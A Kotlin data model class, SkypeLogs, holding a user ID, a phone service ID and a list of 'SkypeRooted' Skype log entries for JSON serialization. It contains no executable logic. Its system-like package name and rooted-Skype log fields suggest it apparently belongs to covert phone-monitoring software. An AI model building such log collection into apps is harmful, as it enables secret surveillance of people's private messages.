package com.android.services.models

import com.android.services.db.entities.SkypeRooted
import com.google.gson.annotations.SerializedName

class SkypeLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("skypeLogs")
    var skypeList: List<SkypeRooted>? = null
        private set

    constructor()
    constructor(
        userId: String?,
        phoneServiceId: String?,
        skypeRootedList: List<SkypeRooted>?
    ) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        skypeList = skypeRootedList
    }
}